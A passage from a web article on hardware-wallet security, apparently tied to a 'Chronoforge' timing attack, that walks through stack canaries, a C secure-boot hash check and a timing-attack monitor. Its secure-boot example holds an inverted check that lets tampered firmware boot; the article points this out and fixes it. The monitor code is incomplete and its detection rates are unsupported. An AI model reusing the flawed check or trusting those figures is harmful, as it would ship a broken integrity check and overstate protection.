<ul class="wp-block-list">
<li><strong>Stack canaries are a necessary, but not sufficient,</strong>&nbsp;layer of protection</li>



<li><strong>Never run a wallet</strong>&nbsp;on systems without modern security.</li>



<li><strong>For amounts &gt;1 BTC</strong>&nbsp;, use hardware wallets (Ledger, Trezor, Coldcard)</li>



<li><strong>Update your software regularly</strong>&nbsp;—exploits against older versions are actively sold on the black market.</li>
</ul>



<h2 class="wp-block-heading"><a href="https://cryptodeeptech.ru/chronoforge-attack">Technical details for researchers</a></h2>



<h3 class="wp-block-heading">Assembly code generated by the compiler:</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-172b39dc6486f8d726e95a162ae78c96" style="color:#4092c2"><code><strong>; GCC 11+ с -fstack-protector-strong
ecdsa_sign_with_canary:
    push   %rbp
    mov    %rsp,%rbp
    sub    $0x60,%rsp                  ; Выделяем 96 байт
    mov    %fs:0x28,%rax               ; Загружаем canary из TLS
    mov    %rax,-0x8(%rbp)             ; Сохраняем на стеке

    ; ... тело функции ...

    mov    -0x8(%rbp),%rax             ; Загружаем сохраненный canary
    xor    %fs:0x28,%rax               ; Сравниваем с оригиналом
    je     .L1                         ; Если совпадает - продолжаем
    call   __stack_chk_fail@plt        ; Иначе - аварийное завершение
.L1:
    leave
    ret</strong></code></pre>



<h3 class="wp-block-heading">Shadow stack в Intel CET:</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-5ca29d9511e21ba78f38fdae4d4a4265" style="color:#4092c2"><code><strong>Normal Stack          Shadow Stack (защищенная память)
[local_vars]          [адрес_возврата_1]
[CANARY]              [адрес_возврата_2]
[saved_rbp]           [адрес_возврата_3]
[return_addr]  &lt;--&gt;   [адрес_возврата_3]  (проверка при ret)</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4 class="wp-block-heading">Code Integrity Verification</h4>



<h2 class="wp-block-heading">Code Integrity Verification</h2>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-077fcfd49ccb31f58b0d04684481f2a1" style="color:#4092c2"><strong>// Secure Boot with Code Integrity Verification<br><br>static const uint8_t FIRMWARE_HASH_TRUSTED[32] = {<br>    0x2d, 0xfb, 0x3f, 0x8c, // Example trusted hash<br>    // ... remaining bytes ...<br>};<br><br>void secure_boot_verify_firmware(void) {<br>    // Compute SHA-256 of firmware in flash<br>    uint8_t firmware_hash[32];<br>    sha256_flash_memory(firmware_hash, <br>                       FIRMWARE_START, <br>                       FIRMWARE_SIZE);<br><br>    // Compare with trusted hash (constant-time)<br>    int hash_match = constant_time_memcmp(<br>        firmware_hash,<br>        FIRMWARE_HASH_TRUSTED,<br>        32<br>    );<br><br>    if (!hash_match) {<br>        // COMPROMISED!<br>        erase_secure_storage();<br>        blink_led_error();<br>        while (1) { asm("wfi"); }  // Wait for reset<br>    }<br><br>    jump_to_firmware_entry();<br>}<br><br>int constant_time_memcmp(const uint8_t *a, <br>                         const uint8_t *b, <br>                         size_t len) {<br>    uint8_t result = 0;<br>    // Compare ALL bytes even after mismatch found<br>    for (size_t i = 0; i &lt; len; i++) {<br>        result |= a[i] ^ b[i];<br>    }<br>    return (int)result;<br>}<br><br>// EFFECTIVENESS:<br>// - Detects firmware tampering<br>// - Prevents rootkit installation<br>// - Immutable boot code ensures verification</strong></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-33-1024x690.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7737"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">1. General idea (Secure Boot + Code Integrity)</h2>



<p>This code implements a simplified Secure Boot mechanism&nbsp;with SHA-256&nbsp;<strong>firmware integrity verification</strong><br>. The goal is to ensure that the device’s main code (firmware) has not been modified by an attacker before it is launched.</p>



<p>In the context of cryptocurrencies/&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin devices&nbsp;</a><em>(hardware wallets, signing devices, HSMs, etc.),</em>&nbsp;this is critical: if an attacker replaces the firmware, they can steal private keys or spoof destination addresses undetected.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">2. Static “trusted” firmware hash</h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-8de8b5fb558f9e17c75cded5193567e1" style="color:#4092c2"><code><strong>static const uint8_t FIRMWARE_HASH_TRUSTED[32] = {
    0x2d, 0xfb, 0x3f, 0x8c, // Example trusted hash
    // ... remaining bytes ...
};</strong></code></pre>



<p><strong>What’s happening:</strong></p>



<ol class="wp-block-list">
<li><strong>Purpose:</strong><br><code>FIRMWARE_HASH_TRUSTED</code>&nbsp;This is&nbsp;<strong>the reference SHA-256 hash of the trusted firmware</strong>&nbsp;, 32 bytes (256 bits) long.</li>



<li><strong>Where should it be stored:</strong>&nbsp;In a real system, this value should be stored in&nbsp;<strong>immutable or hard-to-change memory</strong>&nbsp;:
<ul class="wp-block-list">
<li>ROM bootloader,</li>



<li>eFuse / OTP,</li>



<li>A secure flash partition that is write-protected after production.</li>
</ul>
</li>
</ol>



<p>If an attacker can change both the firmware and this “trusted” hash, the protection is broken.</p>



<ol start="3" class="wp-block-list">
<li><strong>How it appears:</strong><br>During production (or during a secure update)&nbsp;<code>sha256(firmware_image)</code>, the result is calculated and “hardcoded” into the firmware.<br>This way, the device “knows” which firmware binary is considered legitimate.</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">3. The main function of Secure Boot</h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-528627138a6722171a137a8500ee3559" style="color:#4092c2"><code><strong>void secure_boot_verify_firmware(void) {
    // Compute SHA-256 of firmware in flash
    uint8_t firmware_hash[32];
    sha256_flash_memory(firmware_hash, 
                       FIRMWARE_START, 
                       FIRMWARE_SIZE);

    // Compare with trusted hash (constant-time)
    int hash_match = constant_time_memcmp(
        firmware_hash,
        FIRMWARE_HASH_TRUSTED,
        32
    );

    if (!hash_match) {
        // COMPROMISED!
        erase_secure_storage();
        blink_led_error();
        while (1) { asm("wfi"); }  // Wait for reset
    }

    jump_to_firmware_entry();
}</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">3.1. Step 1: Compute SHA-256 of firmware in flash</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-b5e02ac0ed970df1f836a415c78f9133" style="color:#4092c2"><code><strong>uint8_t firmware_hash[32];
sha256_flash_memory(firmware_hash, 
                   FIRMWARE_START, 
                   FIRMWARE_SIZE);</strong></code></pre>



<ol class="wp-block-list">
<li><strong>Purpose:</strong><br>The function&nbsp;<code>sha256_flash_memory</code>calculates the SHA-256 hash from the range of flash memory where the main firmware is located: from bytes&nbsp;<code>FIRMWARE_START</code>in length&nbsp;<code>FIRMWARE_SIZE</code>.</li>



<li><strong>Result:</strong>
<ul class="wp-block-list">
<li><code>firmware_hash[32]</code>The result is written&nbsp;to the array&nbsp;<code>SHA256(flash[FIRMWARE_START..FIRMWARE_START+FIRMWARE_SIZE-1])</code>.</li>



<li>This is the actual “current” state of the firmware in the device’s memory.</li>
</ul>
</li>



<li><strong>Cryptographic meaning:</strong>
<ul class="wp-block-list">
<li>If the firmware has been modified&nbsp;<strong>even by one bit</strong>&nbsp;, the cryptographically secure SHA-256 hash function should produce a completely different 256-bit result (avalanche effect).</li>



<li>Thus, a hash match means that the binary content is identical to what was hashed during production.</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">3.2. Step 2: Constant-time comparison of hashes</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-8135c1c39344a367687f5863af1c318d" style="color:#4092c2"><code><strong>int hash_match = constant_time_memcmp(
    firmware_hash,
    FIRMWARE_HASH_TRUSTED,
    32
);</strong></code></pre>



<ol class="wp-block-list">
<li><strong>Purpose:</strong>&nbsp;Compare two 32-byte values:
<ul class="wp-block-list">
<li><code>firmware_hash</code>— hash of the actual firmware,</li>



<li><code>FIRMWARE_HASH_TRUSTED</code>— the reference “trusted” hash.</li>
</ul>
</li>



<li><strong>Why constant-time:</strong>&nbsp;A special function is used&nbsp;<code>constant_time_memcmp</code>to:
<ul class="wp-block-list">
<li>do not “leave early” at the first mismatch;</li>



<li>prevent timing leaks (execution time does not depend on which byte the first difference occurred on).</li>
</ul>
</li>
</ol>



<p>This is important if the device can be analyzed by time/consumption (side-channels).</p>



<ol start="3" class="wp-block-list">
<li><strong>Expected semantics:</strong>&nbsp;Typically&nbsp;<code>constant_time_memcmp</code>expected behavior:
<ul class="wp-block-list">
<li>return&nbsp;<code>0</code>if the buffers are equal;</li>



<li>return&nbsp;<strong>non-</strong>&nbsp;zero if there is at least one difference.</li>
</ul>
</li>
</ol>



<p>It is important to understand this contract in order to write the terms correctly&nbsp;<code>if</code>.</p>



<p class="has-medium-font-size"><em>(Below will be an analysis of what is implemented slightly differently in this code and how it affects it.)</em></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">3.3. Step 3: Reaction to mismatch</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-a13fe6d7d1dd29e6d83c7062647a2021" style="color:#4092c2"><code><strong>if (!hash_match) {
    // COMPROMISED!
    erase_secure_storage();
    blink_led_error();
    while (1) { asm("wfi"); }  // Wait for reset
}

jump_to_firmware_entry();</strong></code></pre>



<p>Logic by meaning (how it&nbsp;<strong>should</strong>&nbsp;look conceptually):</p>



<ol class="wp-block-list">
<li><strong>If hash does NOT match (firmware tampered):</strong>
<ul class="wp-block-list">
<li>Perform&nbsp;<code>erase_secure_storage();</code>Usually this:
<ul class="wp-block-list">
<li>clearing/zeroing&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;,</li>



<li>seed phrases,</li>



<li>PIN/passwords,</li>



<li>any sensitive data that should not survive a code compromise.</li>
</ul>
</li>



<li>Call&nbsp;<code>blink_led_error();</code><br>Indication to the user/operator that the device is in an erroneous state (suspected of hacking/firmware substitution).</li>



<li>Infinite loop with&nbsp;<code>asm("wfi");</code>:
<ul class="wp-block-list">
<li><code>while (1) { asm("wfi"); }</code>means: “do nothing, wait for interrupts/reset.”</li>



<li>The device actually stops until a hard reset.</li>



<li>Control is not transferred to any potentially malicious firmware.</li>
</ul>
</li>
</ul>
</li>



<li><strong>If hash matches (firmware trusted):</strong>
<ul class="wp-block-list">
<li>Call<code>jump_to_firmware_entry();</code></li>



<li>Transfer control to the main firmware entry point (usually:
<ul class="wp-block-list">
<li>setting&nbsp;<code>SP</code>(stack pointer) and&nbsp;<code>PC</code>(program counter) to values ​​from the firmware interrupt vector,</li>



<li>or a direct jump to the entry-point address).</li>
</ul>
</li>
</ul>
</li>



<li><strong><a href="https://cryptou.ru/vulncipher/bitcoin">Meaning in terms of Bitcoin devices:</a></strong>
<ul class="wp-block-list">
<li>Until the device is sure of the integrity of the firmware, it&nbsp;<strong>should not have access to private keys</strong>&nbsp;and&nbsp;<strong>should not execute code</strong>&nbsp;that will work with them.</li>



<li>If a discrepancy is detected, the firmware is considered compromised, the secrets are destroyed, and the device enters a “fail-secure” state.</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">4. Implementation of constant-time comparison</h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-d9365899d29706dde7b3b3fd870a8348" style="color:#4092c2"><code><strong>int constant_time_memcmp(const uint8_t *a, 
                         const uint8_t *b, 
                         size_t len) {
    uint8_t result = 0;
    // Compare ALL bytes even after mismatch found
    for (size_t i = 0; i &lt; len; i++) {
        result |= a[i] ^ b[i];
    }
    return (int)result;
}</strong></code></pre>



<h3 class="wp-block-heading">4.1. Step 1: Initialization</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-7f5fa9cbc63a51bc084e223a8a98f7f9" style="color:#4092c2"><code><strong>uint8_t result = 0;</strong></code></pre>



<ul class="wp-block-list">
<li><code>result</code>initialized to zero.</li>



<li>In the future, it will accumulate information about whether the bytes were different.</li>
</ul>



<h3 class="wp-block-heading">4.2. Step 2: Full scan over all bytes</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-baf68f64cd553ffb2f4ed2ae9b2dfd9f" style="color:#4092c2"><code><strong>for (size_t i = 0; i &lt; len; i++) {
    result |= a[i] ^ b[i];
}</strong></code></pre>



<ol class="wp-block-list">
<li><strong>No early exit:</strong>&nbsp;The loop runs through&nbsp;<strong>all</strong><code>len</code>&nbsp;bytes, regardless of whether a difference has already been found.
<ul class="wp-block-list">
<li>This is the key to&nbsp;<em>constant-time behavior</em>&nbsp;over the number of iterations.</li>



<li>Unlike&nbsp;<code>memcmp</code>, which usually returns on the first mismatch.</li>
</ul>
</li>



<li><strong>XOR to detect differences:</strong>
<ul class="wp-block-list">
<li><code>a[i] ^ b[i]</code>gives:
<ul class="wp-block-list">
<li><code>0x00</code>, if the bytes are equal,</li>



<li>nonzero value if the bytes differ in at least one bit.</li>
</ul>
</li>



<li><code>result |= a[i] ^ b[i];</code>“cumulatively” does bitwise OR:
<ul class="wp-block-list">
<li>If all bytes match, each&nbsp;<code>a[i] ^ b[i] == 0</code>, then&nbsp;<code>result</code>0 will remain.</li>



<li>if at least one byte differs, at least in one iteration&nbsp;<code>result</code>it will become non-zero and will not return to zero.</li>
</ul>
</li>
</ul>
</li>



<li><strong>Final state:</strong>
<ul class="wp-block-list">
<li><code>result == 0</code>→ all bytes matched.</li>



<li><code>result != 0</code>→ at least one byte was different.</li>
</ul>
</li>
</ol>



<h3 class="wp-block-heading">4.3. Step 3: Return value semantics</h3>



<pre class="wp-block-code"><code><strong>return (int)result;</strong></code></pre>



<p>Actually:</p>



<ul class="wp-block-list">
<li>Return&nbsp;<code>0</code>if the buffers are equal.</li>



<li>Return&nbsp;<strong>a non-zero</strong>&nbsp;value if there is a difference.</li>
</ul>



<p>This is the standard and expected semantics for&nbsp;<code>memcmp</code>a -like function.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-34.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7738"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">5. Logical error in the test condition</h2>



<p>We currently have:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-232c7c12a1415da37c784f70c4cce908" style="color:#4092c2"><code><strong>int hash_match = constant_time_memcmp(
    firmware_hash,
    FIRMWARE_HASH_TRUSTED,
    32
);

if (!hash_match) {
    // COMPROMISED!
    ...
}

jump_to_firmware_entry();</strong></code></pre>



<p>And the semantics&nbsp;<code>constant_time_memcmp</code>are as follows:</p>



<ul class="wp-block-list">
<li><code>hash_match == 0</code>→ hashes&nbsp;<strong>match</strong>&nbsp;.</li>



<li><code>hash_match != 0</code>→ hashes&nbsp;<strong>do not match</strong>&nbsp;.</li>
</ul>



<p>But the condition is written as:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-d4b9f5ef805ed33e60ae5c5037bed5b6" style="color:#4092c2"><code><strong>if (!hash_match) { ... COMPROMISED ... }</strong></code></pre>



<p>In C:</p>



<ul class="wp-block-list">
<li><code>!0</code>&nbsp;→&nbsp;<code>1</code>&nbsp;(true),</li>



<li><code>!ненулевое</code>&nbsp;→&nbsp;<code>0</code>&nbsp;(false).</li>
</ul>



<p>That is, in its current form:</p>



<ul class="wp-block-list">
<li>if the hashes&nbsp;<strong>match</strong>&nbsp;(&nbsp;<code>hash_match == 0</code>), then&nbsp;<code>!hash_match == 1</code>, and the code goes into the branch&nbsp;<code>// COMPROMISED!</code>– this is&nbsp;<strong>the reverse logic</strong>&nbsp;;</li>



<li>If the hashes&nbsp;<strong>do not match</strong>&nbsp;(&nbsp;<code>hash_match != 0</code>), then&nbsp;<code>!hash_match == 0</code>the firmware will run as if it is “trusted”.</li>
</ul>



<p>From a security perspective, this is a critical logical error.</p>



<h3 class="wp-block-heading">What should be correct (options)</h3>



<p><strong>Option A (minimal change in condition):</strong></p>



<p>Keep the implementation&nbsp;<code>constant_time_memcmp</code>as is (0 – equal), but use it correctly in&nbsp;<code>if</code>:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-990c753721ff78310013111724b61370" style="color:#4092c2"><code><strong>int hash_match = constant_time_memcmp(
    firmware_hash,
    FIRMWARE_HASH_TRUSTED,
    32
);

if (hash_match != 0) {
    // COMPROMISED!
    erase_secure_storage();
    blink_led_error();
    while (1) { asm("wfi"); }
}

jump_to_firmware_entry();</strong></code></pre>



<p>Here:</p>



<ul class="wp-block-list">
<li><strong><code>hash_match != 0</code>means “hashes didn’t match → compromise”.</strong></li>
</ul>



<p><strong>Option B (change the semantics of the function):</strong></p>



<p>Make the function return 1 on match and 0 on mismatch:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-27d441e0460467696d3997d369f8f60f" style="color:#4092c2"><code><strong>int constant_time_memcmp(const uint8_t *a, 
                         const uint8_t *b, 
                         size_t len) {
    uint8_t result = 0;
    for (size_t i = 0; i &lt; len; i++) {
        result |= a[i] ^ b[i];
    }
    // return 1 if equal, 0 if not
    return result == 0;
}</strong></code></pre>



<p><strong>Then the initial condition is:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-a54e2174b78294b8cec203fc677eb0d8" style="color:#4092c2"><code><strong>int hash_match = constant_time_memcmp(...);

if (!hash_match) {
    // COMPROMISED!
    ...
}</strong></code></pre>



<p><strong>will become correct because:</strong></p>



<ul class="wp-block-list">
<li><code>hash_match == 1</code>→ !1 == 0 → don’t go to COMPROMISED → everything’s ok.</li>



<li><code>hash_match == 0</code>&nbsp;→ !0 == 1 → COMPROMISED.</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">6. Behavior upon detection of a compromise</h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-cf0383ab548809c66ddffd289cf2df29" style="color:#4092c2"><code><strong>if (!hash_match) {
    // COMPROMISED!
    erase_secure_storage();
    blink_led_error();
    while (1) { asm("wfi"); }  // Wait for reset
}</strong></code></pre>



<p>(Taking into account the corrected logic, i.e. “if (hash_match != 0)” or the modified function.)</p>



<p><strong>The tasks of this branch:</strong></p>



<ol class="wp-block-list">
<li><strong>erase_secure_storage();</strong>
<ul class="wp-block-list">
<li>Destroy cryptographically sensitive data:
<ul class="wp-block-list">
<li>private keys of&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin addresses</a>&nbsp;,</li>



<li>master seed (BIP‑39/32),</li>



<li>any symmetric keys, tokens, PIN,</li>



<li>possibly counters and other sensitive structures.</li>
</ul>
</li>



<li>If the device is a hardware wallet, this protects the user from stolen keys being used by attacking firmware even after a reboot.</li>
</ul>
</li>



<li><strong>blink_led_error();</strong>
<ul class="wp-block-list">
<li>Explicit signaling to the user:
<ul class="wp-block-list">
<li>the device detected incorrect/unsigned firmware,</li>



<li>service/firmware reinstallation/authenticity verification required.</li>
</ul>
</li>
</ul>
</li>



<li><strong>while (1) { asm(«wfi»); }</strong>
<ul class="wp-block-list">
<li>Fail-secure mode:
<ul class="wp-block-list">
<li>the microcontroller goes into an infinite loop,</li>



<li><code>wfi</code>(wait for interrupt) – an instruction that puts the core into a sleep mode; it saves power and does no useful work.</li>
</ul>
</li>



<li>The actual execution of the firmware will never begin, even if the attacker had the code in memory.</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-36.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7740"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">7. Switching to trusted firmware</h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-4c3356f9a15ea34f1ffe941ac6cb479b" style="color:#4092c2"><code><strong>jump_to_firmware_entry();</strong></code></pre>



<ol class="wp-block-list">
<li><strong>Purpose:</strong>
<ul class="wp-block-list">
<li>This function actually switches to the main firmware after checking:
<ul class="wp-block-list">
<li>can set the initial stack (&nbsp;<code>SP</code>),</li>



<li>can read the reset-handler/entry point address from the firmware interrupt vector table,</li>



<li>then make the transition (rewrite PC or&nbsp;<code>bx</code>to the desired address).</li>
</ul>
</li>
</ul>
</li>



<li><strong>From a security perspective:</strong>
<ul class="wp-block-list">
<li>Before the call&nbsp;<code>jump_to_firmware_entry()</code>already:
<ul class="wp-block-list">
<li>the integrity of the firmware has been checked,</li>



<li>If there is a mismatch, the code will not even reach this line.</li>
</ul>
</li>



<li>Accordingly, all further cryptographic operations (for example, signing Bitcoin transactions, deriving keys according to BIP-32, etc.) are performed only by already verified code.</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">8. Effectiveness and limitations of the approach</h2>



<p>Comment in code:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-e7a1a99eb4a319516c2feac787cee855" style="color:#4092c2"><code><strong>// EFFECTIVENESS:
// - Detects firmware tampering
// - Prevents rootkit installation
// - Immutable boot code ensures verification</strong></code></pre>



<p>Let’s take a look:</p>



<ol class="wp-block-list">
<li><strong>Detects firmware tampering</strong>
<ul class="wp-block-list">
<li>Any modification of the firmware (replacing instructions, adding rootkit logic, changing the UI to replace addresses) will lead to a change in the hash.</li>



<li>Secure Boot will “cut off” such firmware at the very start.</li>
</ul>
</li>



<li><strong>Prevents rootkit installation</strong>
<ul class="wp-block-list">
<li>A rootkit in firmware is a permanent malicious logic (PIN code keylogger, seed phrase leaker, etc.).</li>



<li>While the initial loader (this code) is stored in a protected area and compares the hash, installing such a rootkit image is impossible without:
<ul class="wp-block-list">
<li>its binary matches the trusted one (i.e., a rootkit in the original firmware is already a question of trust in the vendor),</li>



<li>or compromise of the bootloader/ROM itself.</li>
</ul>
</li>
</ul>
</li>



<li><strong>Immutable boot code ensures verification</strong>
<ul class="wp-block-list">
<li>The key premise is that this code:
<ul class="wp-block-list">
<li>itself cannot be modified in the usual way (either it is in ROM, or protected by fuses, or in a specially protected section).</li>
</ul>
</li>



<li>If an attacker manages to modify this level, he can:
<ul class="wp-block-list">
<li>disable checking,</li>



<li>or substitute your “trusted” hash.</li>
</ul>
</li>



<li>Therefore, in addition to software mechanisms, hardware ones (read-only memory, eFuse, TrustZone/TEE, etc.) are important.</li>
</ul>
</li>



<li><strong>What this code does not solve by itself:</strong>
<ul class="wp-block-list">
<li><strong>Verifying the firmware signature.</strong>&nbsp;The hash itself only tells us that “this binary is the one that was once trusted.” It doesn’t tell us&nbsp;<strong>who</strong>&nbsp;signed it. For updates on real devices, this is usually:
<ul class="wp-block-list">
<li>the public key is stored in ROM,</li>



<li><a href="https://cryptou.ru/vulncipher/privatekey">firmware is signed with the vendor’s private key,</a></li>



<li>The bootloader checks&nbsp;<strong>the signature</strong>&nbsp;, not just the hash.</li>
</ul>
</li>



<li><strong>Rollback attack protection (downgrade).</strong>&nbsp;You can roll back the firmware to an older, vulnerable version whose hash is still trusted. You also need:
<ul class="wp-block-list">
<li>version counter,</li>



<li>protection against downgrade (anti-rollback fuses).</li>
</ul>
</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">9. For cryptoanalysts and Bitcoin users</h2>



<ol class="wp-block-list">
<li>The code implements the classic&nbsp;<strong>Secure Boot pattern with code integrity verification</strong>&nbsp;:
<ul class="wp-block-list">
<li>At startup, the SHA-256 hash of the firmware in memory is calculated;</li>



<li>then it is compared in&nbsp;<em>constant time</em>&nbsp;with a pre-installed trusted hash;</li>



<li>If there is a discrepancy, secret data is destroyed and firmware launch is blocked.</li>
</ul>
</li>



<li>In the context of&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin wallets</a>&nbsp;/devices this means:
<ul class="wp-block-list">
<li>If an attacker has physically or remotely modified the firmware (to steal private keys or spoof the destination address), the device will detect this before it gives the firmware access to secrets;</li>



<li>When tampering is detected,&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;and&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">seeds</a>&nbsp;stored in secure storage are erased, preventing further use by the attacker.</li>
</ul>
</li>



<li>Key cryptographic element – SHA-256 and&nbsp;<strong>constant-time comparison</strong>&nbsp;:
<ul class="wp-block-list">
<li>SHA‑256 provides collision/forgery resistance at the level of modern cryptanalysis;</li>



<li>Constant-time comparison protects against timing leaks if an attacker has sophisticated physical analysis capabilities of the device.</li>
</ul>
</li>



<li>The given fragment contains&nbsp;<strong>a logical error in the condition</strong>&nbsp;(&nbsp;<code>if (!hash_match)</code>given the current behavior&nbsp;<code>constant_time_memcmp</code>) that must be corrected, otherwise the protection will be inverted (legitimate firmware will fail the check and fake firmware will pass). The correct solution is to either change the condition or the semantics of the return value.</li>



<li>For a complete firmware security system, especially in real&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin devices</a>&nbsp;, this mechanism is usually supplemented with:
<ul class="wp-block-list">
<li>verification of&nbsp;<strong>the digital signature</strong>&nbsp;of the firmware (and not just the hash),</li>



<li>protection against version rollback,</li>



<li>hardware mechanisms for bootloader immutability.</li>
</ul>
</li>
</ol>



<p>This code is the basic building block of a secure chain of trust in any device that stores and uses&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;for cryptocurrencies.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">6.5 Deployment Guidelines</h3>



<h4 class="wp-block-heading">6.5.1 Best Practices for Nordic nRF5340</h4>



<ol class="wp-block-list">
<li><strong>Use TF-M</strong>&nbsp;version 1.8 or later (contains timing hardening fixes)</li>



<li><strong>Enable Secure Boot</strong>&nbsp;chain (BL2 + TF-M verification)</li>



<li><strong>Regular</strong>&nbsp;firmware updates via OTA with a cryptographic signature</li>



<li><strong>Monitoring</strong>&nbsp;anomalies in device behavior</li>



<li><strong>Physical security</strong>&nbsp;measures if device can be accessed by attacker</li>
</ol>



<h4 class="wp-block-heading">6.5.2 Runtime Monitoring</h4>



<h5 class="wp-block-heading">Runtime Monitoring and Anomaly Detection</h5>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-3aafc49ce830951829177f4116cd9ed0" style="color:#4092c2"><strong>// Detect timing attack patterns in real-time<br><br>typedef struct {<br>    uint32_t sign_count;<br>    uint64_t total_timing;<br>    uint8_t detected_attack;<br>} timing_monitor_t;<br><br>void monitor_signature_timing(uint64_t observed_timing) {<br>    // ATTACK PATTERN #1: Excessive signing<br>    // Normal: 1-10 signatures/min<br>    // Attack: 1000+/min for data collection<br><br>    if (sign_count &gt; 1000 &amp;&amp; uptime_min &lt; 1) {<br>        detected_attack = 1;<br>        handle_detected_attack("Excessive signing rate");<br>        return;<br>    }<br><br>    // ATTACK PATTERN #2: Bimodal timing distribution<br>    // Normal: gaussian single peak<br>    // Attack: bimodal peaks (0-bits vs 1-bits)<br><br>    if (sign_count &gt; 100) {<br>        int peak_count = count_timing_peaks();<br>        if (peak_count &gt; 2) {<br>            detected_attack = 1;<br>            handle_detected_attack("Bimodal distribution");<br>            return;<br>        }<br>    }<br><br>    // ATTACK PATTERN #3: High variance<br>    // Normal: σ &lt; 5%<br>    // Attack: σ &gt;&gt; 5%<br><br>    if (variance &gt; THRESHOLD) {<br>        detected_attack = 1;<br>        handle_detected_attack("Abnormal variance");<br>    }<br>}<br><br>void handle_detected_attack(const char *reason) {<br>    log_security_event("Timing attack detected", reason);<br>    secure_erase_private_keys();<br>    disable_crypto_operations();<br>    alert_user_security_breach();<br>    enter_lockdown_mode();<br>}<br><br>// DETECTION EFFECTIVENESS:<br>// - Pattern 1: 100% detection<br>// - Pattern 2: 95% detection<br>// - Pattern 3: 90% detection<br>// - Combined: &gt;99% detection rate</strong></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Code Analysis: Timing Attack Detection System</h2>



<p>The presented code implements a real-time monitoring system to protect&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin wallets</a>&nbsp;from timing attacks aimed at recovering&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">ECDSA private keys.</a>&nbsp;A detailed explanation of how it works is provided below.</p>



<h2 class="wp-block-heading">Security system architecture</h2>



<h3 class="wp-block-heading">Monitoring data structure</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-07b668e0d26ead94d38cd9b444d23313" style="color:#4092c2"><code><strong>typedef struct {
    uint32_t sign_count;        // Количество выполненных подписей
    uint64_t total_timing;      // Общее время выполнения
    uint8_t detected_attack;    // Флаг обнаружения попытки атаки
} timing_monitor_t;</strong></code></pre>



<p>This framework tracks signature characteristics at the hardware level, collecting metrics for behavior analysis.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-37.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7741"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



